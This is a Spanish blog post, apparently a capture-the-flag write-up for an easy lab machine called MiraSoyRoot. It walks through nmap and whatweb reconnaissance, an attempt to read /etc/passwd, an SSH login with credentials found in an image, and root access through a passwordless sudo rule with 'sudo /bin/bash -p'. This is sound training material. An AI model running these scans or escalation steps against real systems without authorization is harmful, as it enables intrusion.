---
layout: post
title: Mirasoyroot
subtitle: Plataforma MiraSoyRoot Dificultad Muy Fácil
cover-img: /assets/img/mirasoyroot.png
thumbnail-img: /assets/img/mirasoyroot.png
share-img: /assets/img/mirasoyroot.png
author: Elmili72
---

<img width="227" height="222" alt="image" src="https://github.com/user-attachments/assets/ce9c451f-14bf-4521-8d9b-f0c115414357" />

## Escaneo general de puertos

```bash
❯ sudo nmap -sS -p- --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allports
Host is up, received arp-response (0.0000020s latency).
Scanned at 2025-06-23 17:41:06 CEST for 0s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

## Escaneo específico de puertos

```bash
❯ nmap -sCV -p22,80 172.17.0.2 -oN target
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 83:fe:8d:4e:47:c9:95:40:bb:10:89:be:b8:a1:ef:03 (ECDSA)
|_  256 80:1c:dd:6a:c7:b5:8f:93:70:a7:32:83:e3:1e:7e:4c (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: TIME LUXURY WATCHES
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Reconocimiento de Servicio Web

```bash
❯ whatweb http://172.17.0.2
http://172.17.0.2 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Title[TIME LUXURY WATCHES]
```

![[Pasted image 20250623174409.png]]

![[Pasted image 20250623174419.png]]

Aquí cualquiera puede pensar, pues bueno intentamos enumerar directorios con LFI para intentar exfiltrar el archivo */etc/passwd*. Pues nuestro amigo y venico Yerman nos tiene una sorpresa jejejej.

![[Pasted image 20250623175407.png]]

No diré en que imagen se encuentras las credenciales jijiji.

## Explotación

### Intrusión

```bash
❯ ssh pablo@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:KN2v7mhMbB2KMFDXfIyBZ3RSeXTGDTEQXnLuzqc2OhU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
pablo@172.17.0.2's password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.12.25-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Thu Feb 20 12:13:26 2025 from 172.17.0.1
pablo@5f93963c4c51:~$ whoami
pablo
pablo@5f93963c4c51:~$ id
uid=1001(pablo) gid=1001(pablo) groups=1001(pablo)
```

## Post-Explotación

### Escalada de Privilegios

```bash
pablo@5f93963c4c51:~$ sudo -l
Matching Defaults entries for pablo on 5f93963c4c51:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User pablo may run the following commands on 5f93963c4c51:
    (ALL) NOPASSWD: /bin/bash
```

```bash
pablo@5f93963c4c51:~$ sudo /bin/bash -p
root@5f93963c4c51:/home/pablo# whoami
root
root@5f93963c4c51:/home/pablo# id
uid=0(root) gid=0(root) groups=0(root)
root@5f93963c4c51:/home/pablo# cd /root
root@5f93963c4c51:~# cat mirasoyroot.txt 
Felicidades!!! Lo has conseguido.
Si eres de los tres pirmeros en 
completar la maquina enviame una 
captura de esto y te pondre en el
podio de la web.
```

¡Espero que os haya gustado y os haya servido de ayuda! ¡Hasta el próximo writeup!
